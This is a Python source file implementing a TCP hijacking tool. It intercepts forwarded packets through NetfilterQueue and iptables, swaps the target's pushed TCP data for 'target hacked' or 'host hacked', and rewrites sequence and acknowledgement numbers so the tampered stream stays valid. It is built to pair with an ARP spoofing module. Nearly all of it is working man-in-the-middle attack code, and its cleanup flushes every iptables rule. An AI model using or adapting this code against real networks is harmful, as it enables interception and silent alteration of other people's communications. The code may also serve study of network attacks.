from netfilterqueue import NetfilterQueue as NFQ
from netfilterqueue import Packet
from arp_spoofing import ArpSpoofing
from custom_packet import CustomPacket
import os, sys, threading, socket


class TcpHijaking:
  def __init__(self, target_ipv4: str, default_gateway: str) -> None:
    self.target_ipv4 = target_ipv4
    self.default_gateway = default_gateway

    self.received_data = {}
    self.hacked_received_data = {}

    self.sent_data = {}
    self.hacked_sent_data = {}


  def detect_and_alter_packet(self, packet: Packet):
    cp = CustomPacket(packet.get_payload())
    # if is not TCP
    if cp.get_protocol_type() != 6:
      packet.accept()
      return

    # if it isn't a message be target and other host
    if cp.get_dest_ip() != self.target_ipv4 and cp.get_source_ip() != self.target_ipv4:
      packet.accept()
      return

    if cp.get_source_ip() == self.target_ipv4:
      host_ip = cp.get_dest_ip()
      new_message = "target hacked" if cp.get_flags('PSH') else cp.get_data()

      # How much did the target actually sent
      if self.sent_data.get(host_ip, 0) == 0:
        self.sent_data[host_ip] = cp.get_seq() + len(cp.data)
      else:
        self.sent_data[host_ip] += len(cp.data)

       # How much did we sent in his name
      if self.hacked_sent_data.get(host_ip, 0) == 0:
        self.hacked_sent_data[host_ip] = cp.get_seq() + len(new_message)
      else:
        self.hacked_sent_data[host_ip] += len(new_message)

      cp.set_data(new_message)

      # We tell the other host TO READ where we left off with the modified data of the target
      if self.hacked_sent_data.get(host_ip, 0) != 0:
        cp.set_seq(self.hacked_sent_data[host_ip] - len(new_message))

      # We tell other host that WE READ all the data that he actually sent
      if self.received_data.get(host_ip, 0) != 0:
        cp.set_ack(self.received_data[host_ip])

      packet.set_payload(cp.payload)

    if cp.get_dest_ip() == self.target_ipv4:
      host_ip = cp.get_source_ip()
      new_message = "host hacked" if cp.get_flags('PSH') else cp.get_data()
      
      # How much did the other host actually sent
      if self.received_data.get(host_ip, 0) == 0:
        self.received_data[host_ip] = cp.get_seq() + len(cp.data)
      else:
        self.received_data[host_ip] += len(cp.data)

      # How much did we sent in his name
      if self.hacked_received_data.get(host_ip, 0) == 0:
        self.hacked_received_data[host_ip] = cp.get_seq() + len(new_message)
      else:
        self.hacked_received_data[host_ip] += len(new_message)
  
      cp.set_data(new_message)

      # We tell the target TO READ where we left off with the modified data of the host
      if self.hacked_received_data.get(host_ip, 0) != 0:
        cp.set_seq(self.hacked_received_data[cp.get_source_ip()] - len(new_message))

      # We tell the target that WE READ all the data that he actually sent
      if self.sent_data.get(host_ip, 0) != 0:
        cp.set_ack(self.sent_data[host_ip])

      packet.set_payload(cp.payload)

    print(f"{cp.get_source_ip()} => {cp.get_dest_ip()}")
    print(f"data: {cp.get_data()}")
    print("=====================================")

    packet.accept()

  def run(self):
    # arp_spoofing = ArpSpoofing()
    # my_thread = threading.Thread(target=arp_spoofing.run, args=(self.target_ipv4, self.default_gateway))
    # my_thread.start()
    queue = NFQ()
    try:
      os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
      queue.bind(10, self.detect_and_alter_packet)
      queue.run()
    except KeyboardInterrupt:
      print('TCP: deleting iptables rules')
      os.system("iptables -F")
      queue.unbind()

      os.system(f'iptables -D FORWARD -j ACCEPT')
      os.system(f'iptables -t nat -s 192.168.68.0/24 -D POSTROUTING -j MASQUERADE')
      os.system(f'iptables -t nat -D POSTROUTING -j MASQUERADE')
      os.system(f'iptables -D OUTPUT -j ACCEPT')


if __name__ == '__main__':
  t = TcpHijaking(sys.argv[1], sys.argv[2])
  t.run()
